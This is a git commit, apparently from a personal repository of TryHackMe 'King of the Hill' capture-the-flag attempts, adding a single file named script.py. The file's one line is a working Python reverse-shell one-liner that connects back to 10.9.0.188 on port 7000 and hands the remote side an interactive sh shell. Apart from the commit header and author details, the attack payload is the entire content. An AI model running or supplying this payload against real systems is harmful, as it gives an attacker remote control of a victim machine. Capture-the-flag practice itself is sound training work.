2c27c47f6adb03cd326d599e71f74b45b7f355dc
KZEbe <vincent.jyf1@gmail.com>
2025-04-13 14:53:58 +0200

    King Of The Hill TryHackMe : 1 attemps

---
+++ TryHackMe/KOTH_Games/script.py
@@ -0,0 +1,1 @@
+export RHOST="10.9.0.188";export RPORT=7000;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
